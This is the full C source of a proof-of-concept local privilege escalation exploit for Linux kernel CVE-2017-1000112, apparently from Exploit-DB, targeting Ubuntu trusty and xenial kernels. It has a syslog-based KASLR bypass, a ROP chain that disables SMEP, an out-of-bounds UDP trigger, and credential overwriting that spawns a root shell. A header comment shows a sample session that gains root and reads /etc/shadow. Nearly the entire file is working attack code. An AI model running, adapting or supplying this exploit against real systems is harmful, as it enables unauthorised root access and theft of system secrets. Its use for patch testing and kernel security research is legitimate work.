// A proof-of-concept local root exploit for CVE-2017-1000112.
// Includes KASLR and SMEP bypasses. No SMAP bypass.
// Tested on Ubuntu trusty 4.4.0-* and Ubuntu xenial 4-8-0-* kernels.
//
// EDB Note: Also included the work from ~ https://ricklarabee.blogspot.co.uk/2017/12/adapting-poc-for-cve-2017-1000112-to.html
//           Supports: Ubuntu Xenial (16.04) 4.4.0-81 
//
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
// user@ubuntu:~$ whoami
// user
// user@ubuntu:~$ id
// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn 
// [.] starting
// [.] checking distro and kernel versions
// [.] kernel version '4.8.0-58-generic' detected
// [~] done, versions looks good
// [.] checking SMEP and SMAP
// [~] done, looks good
// [.] setting up namespace sandbox
// [~] done, namespace sandbox set up
// [.] KASLR bypass enabled, getting kernel addr
// [~] done, kernel text:   ffffffffae400000
// [.] commit_creds:        ffffffffae4a5d20
// [.] prepare_kernel_cred: ffffffffae4a6110
// [.] SMEP bypass enabled, mmapping fake stack
// [~] done, fake stack mmapped
// [.] executing payload ffffffffae40008d
// [~] done, should be root now
// [.] checking if we got root
// [+] got r00t ^_^
// root@ubuntu:/home/user# whoami
// root
// root@ubuntu:/home/user# id
// uid=0(root) gid=0(root) groups=0(root)
// root@ubuntu:/home/user# cat /etc/shadow
// root:!:17246:0:99999:7:::
// daemon:*:17212:0:99999:7:::
// bin:*:17212:0:99999:7:::
// sys:*:17212:0:99999:7:::
// ...
//
// EDB Note: Details ~ http://www.openwall.com/lists/oss-security/2017/08/13/1
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/socket.h>
#include <netinet/ip.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/utsname.h>

#define ENABLE_KASLR_BYPASS		1
#define ENABLE_SMEP_BYPASS		1

// Will be overwritten if ENABLE_KASLR_BYPASS is enabled.
unsigned long KERNEL_BASE =		0xffffffff81000000ul;

// Will be overwritten by detect_versions().
int kernel = -1;

struct kernel_info {
	const char* distro;
	const char* version;
	uint64_t commit_creds;
	uint64_t prepare_kernel_cred;
	uint64_t xchg_eax_esp_ret;
	uint64_t pop_rdi_ret;
	uint64_t mov_dword_ptr_rdi_eax_ret;
	uint64_t mov_rax_cr4_ret;
	uint64_t neg_rax_ret;
	uint64_t pop_rcx_ret;
	uint64_t or_rax_rcx_ret;
	uint64_t xchg_eax_edi_ret;
	uint64_t mov_cr4_rdi_ret;
	uint64_t jmp_rcx;
};

struct kernel_info kernels[] = {
	{ "xenial", "4.8.0-58-generic", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },
};

// Used to get root privileges.
#define COMMIT_CREDS			(KERNEL_BASE + kernels[kernel].commit_creds)
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + kernels[kernel].prepare_kernel_cred)

// Used when ENABLE_SMEP_BYPASS is used.
// - xchg eax, esp ; ret
// - pop rdi ; ret
// - mov dword ptr [rdi], eax ; ret
// - push rbp ; mov rbp, rsp ; mov rax, cr4 ; pop rbp ; ret
// - neg rax ; ret
// - pop rcx ; ret 
// - or rax, rcx ; ret
// - xchg eax, edi ; ret
// - push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
// - jmp rcx
#define XCHG_EAX_ESP_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_esp_ret)
#define POP_RDI_RET			(KERNEL_BASE + kernels[kernel].pop_rdi_ret)
#define MOV_DWORD_PTR_RDI_EAX_RET	(KERNEL_BASE + kernels[kernel].mov_dword_ptr_rdi_eax_ret)
#define MOV_RAX_CR4_RET			(KERNEL_BASE + kernels[kernel].mov_rax_cr4_ret)
#define NEG_RAX_RET			(KERNEL_BASE + kernels[kernel].neg_rax_ret)
#define POP_RCX_RET			(KERNEL_BASE + kernels[kernel].pop_rcx_ret)
#define OR_RAX_RCX_RET			(KERNEL_BASE + kernels[kernel].or_rax_rcx_ret)
#define XCHG_EAX_EDI_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_edi_ret)
#define MOV_CR4_RDI_RET			(KERNEL_BASE + kernels[kernel].mov_cr4_rdi_ret)
#define JMP_RCX				(KERNEL_BASE + kernels[kernel].jmp_rcx)

// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *

typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

void get_root(void) {
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
}

// * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *

uint64_t saved_esp;

// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
	asm volatile ("					\n\
	payload:					\n\
		movq %%rbp, %%rax			\n\
		movq $0xffffffff00000000, %%rdx		\n\
		andq %%rdx, %%rax			\n\
		movq %0, %%rdx				\n\
		addq %%rdx, %%rax			\n\
		movq %%rax, %%rsp			\n\
		call get_root				\n\
		ret					\n\
	" : : "m"(saved_esp) : );
}

void payload();

#define CHAIN_SAVE_ESP				\
	*stack++ = POP_RDI_RET;			\
	*stack++ = (uint64_t)&saved_esp;	\
	*stack++ = MOV_DWORD_PTR_RDI_EAX_RET;

#define SMEP_MASK 0x100000

#define CHAIN_DISABLE_SMEP			\
	*stack++ = MOV_RAX_CR4_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = POP_RCX_RET;			\
	*stack++ = SMEP_MASK;			\
	*stack++ = OR_RAX_RCX_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = XCHG_EAX_EDI_RET;		\
	*stack++ = MOV_CR4_RDI_RET;

#define CHAIN_JMP_PAYLOAD                     \
	*stack++ = POP_RCX_RET;               \
	*stack++ = (uint64_t)&payload;        \
	*stack++ = JMP_RCX;

void mmap_stack() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = XCHG_EAX_ESP_RET % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}

	stack = (uint64_t*)((char*)stack_aligned + stack_offset);

	CHAIN_SAVE_ESP;
	CHAIN_DISABLE_SMEP;
	CHAIN_JMP_PAYLOAD;
}

// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

void mmap_syslog(char** buffer, int* size) {
	*size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)");
		exit(EXIT_FAILURE);
	}

	*size = (*size / getpagesize() + 1) * getpagesize();
	*buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	*size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_READ_ALL)");
		exit(EXIT_FAILURE);
	}
}

unsigned long get_kernel_addr_trusty(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (end = start; substr[end] != '-'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xffffffffff000000ul;

	return r;
}

unsigned long get_kernel_addr_xenial(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (start = 0; substr[start] != '-'; start++);
	for (end = start; substr[end] != '\n'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xfffffffffff00000ul;
	r -= 0x1000000ul;

	return r;
}

unsigned long get_kernel_addr() {
	char* syslog;
	int size;
	mmap_syslog(&syslog, &size);

	if (strcmp("trusty", kernels[kernel].distro) == 0 &&
	    strncmp("4.4.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_trusty(syslog, size);
	if (strcmp("xenial", kernels[kernel].distro) == 0 &&
	    strncmp("4.8.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_xenial(syslog, size);

	printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
	exit(EXIT_FAILURE);
}

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

struct ubuf_info {
	uint64_t callback;	// void (*callback)(struct ubuf_info *, bool)
	uint64_t ctx;		// void *
	uint64_t desc;		// unsigned long
};

struct skb_shared_info {
	uint8_t nr_frags;	// unsigned char
	uint8_t tx_flags;	// __u8
	uint16_t gso_size;	// unsigned short
	uint16_t gso_segs;	// unsigned short
	uint16_t gso_type;	// unsigned short
	uint64_t frag_list;	// struct sk_buff *
	uint64_t hwtstamps;	// struct skb_shared_hwtstamps
	uint32_t tskey;		// u32
	uint32_t ip6_frag_id;	// __be32
	uint32_t dataref;	// atomic_t
	uint64_t destructor_arg; // void *
	uint8_t frags[16][17];	// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func;
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define SHINFO_OFFSET 3164

void oob_execute(unsigned long payload) {
	char buffer[4096];
	memset(&buffer[0], 0x42, 4096);
	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);

	int s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("[-] socket()");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (connect(s, (void*)&addr, sizeof(addr))) {
		perror("[-] connect()");
		exit(EXIT_FAILURE);
	}

	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
	int rv = send(s, buffer, size, MSG_MORE);
	if (rv != size) {
		perror("[-] send()");
		exit(EXIT_FAILURE);
	}

	int val = 1;
	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));
	if (rv != 0) {
		perror("[-] setsockopt(SO_NO_CHECK)");
		exit(EXIT_FAILURE);
	}

	send(s, buffer, 1, 0);

	close(s);
}

// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *

#define CHUNK_SIZE 1024

int read_file(const char* file, char* buffer, int max_length) {
	int f = open(file, O_RDONLY);
	if (f == -1)
		return -1;
	int bytes_read = 0;
	while (true) {
		int bytes_to_read = CHUNK_SIZE;
		if (bytes_to_read > max_length - bytes_read)
			bytes_to_read = max_length - bytes_read;
		int rv = read(f, &buffer[bytes_read], bytes_to_read);
		if (rv == -1)
			return -1;
		bytes_read += rv;
		if (rv == 0)
			return bytes_read;
	}
}

#define LSB_RELEASE_LENGTH 1024

void get_distro_codename(char* output, int max_length) {
	char buffer[LSB_RELEASE_LENGTH];
	int length = read_file("/etc/lsb-release", &buffer[0], LSB_RELEASE_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/etc/lsb-release)");
		exit(EXIT_FAILURE);
	}
	const char *needle = "DISTRIB_CODENAME=";
	int needle_length = strlen(needle);
	char* found = memmem(&buffer[0], length, needle, needle_length);
	if (found == NULL) {
		printf("[-] couldn't find DISTRIB_CODENAME in /etc/lsb-release\n");
		exit(EXIT_FAILURE);
	}
	int i;
	for (i = 0; found[needle_length + i] != '\n'; i++) {
		assert(i < max_length);
		assert((found - &buffer[0]) + needle_length + i < length);
		output[i] = found[needle_length + i];
	}
}

void get_kernel_version(char* output, int max_length) {
	struct utsname u;
	int rv = uname(&u);
	if (rv != 0) {
		perror("[-] uname())");
		exit(EXIT_FAILURE);
	}
	assert(strlen(u.release) <= max_length);
	strcpy(&output[0], u.release);
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

#define DISTRO_CODENAME_LENGTH 32
#define KERNEL_VERSION_LENGTH 32

void detect_versions() {
	char codename[DISTRO_CODENAME_LENGTH];
	char version[KERNEL_VERSION_LENGTH];

	get_distro_codename(&codename[0], DISTRO_CODENAME_LENGTH);
	get_kernel_version(&version[0], KERNEL_VERSION_LENGTH);

	int i;
	for (i = 0; i < ARRAY_SIZE(kernels); i++) {
		if (strcmp(&codename[0], kernels[i].distro) == 0 &&
		    strcmp(&version[0], kernels[i].version) == 0) {
			printf("[.] kernel version '%s' detected\n", kernels[i].version);
			kernel = i;
			return;
		}
	}

	kernel = 0;
	return;
}

#define PROC_CPUINFO_LENGTH 4096

// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP
int smap_smep_enabled() {
	char buffer[PROC_CPUINFO_LENGTH];
	int length = read_file("/proc/cpuinfo", &buffer[0], PROC_CPUINFO_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/proc/cpuinfo)");
		exit(EXIT_FAILURE);
	}
	int rv = 0;
	char* found = memmem(&buffer[0], length, "smep", 4);
	if (found != NULL)
		rv += 1;
	found = memmem(&buffer[0], length, "smap", 4);
	if (found != NULL)
		rv += 2;
	return rv;
}

void check_smep_smap() {
	int rv = smap_smep_enabled();
	if (rv >= 2) {
		printf("[-] SMAP detected, no bypass available\n");
		exit(EXIT_FAILURE);
	}
#if !ENABLE_SMEP_BYPASS
	if (rv >= 1) {
		printf("[-] SMEP detected, use ENABLE_SMEP_BYPASS\n");
		exit(EXIT_FAILURE);
	}
#endif
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

static bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		printf("[!] unprivileged user namespaces are not available\n");
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo mtu 1500") != 0) {
		perror("[-] system(/sbin/ifconfig lo mtu 1500)");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

void exec_shell() {
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");
	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}
	printf("[+] got r00t ^_^\n");
	exec_shell();
}

int main(int argc, char** argv) {
	printf("[.] starting\n");

	printf("[.] checking distro and kernel versions\n");
	detect_versions();
	printf("[~] done, versions looks good\n");

	printf("[.] checking SMEP and SMAP\n");
	check_smep_smap();
	printf("[~] done, looks good\n");

	printf("[.] setting up namespace sandbox\n");
	setup_sandbox();
	printf("[~] done, namespace sandbox set up\n");

#if ENABLE_KASLR_BYPASS
	printf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr();
	printf("[~] done, kernel text:   %lx\n", KERNEL_BASE);
#endif

	printf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	printf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	printf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	printf("[~] done, fake stack mmapped\n");
#endif

	printf("[.] executing payload %lx\n", payload);
	oob_execute(payload);
	printf("[~] done, should be root now\n");

	check_root();

	return 0;
}
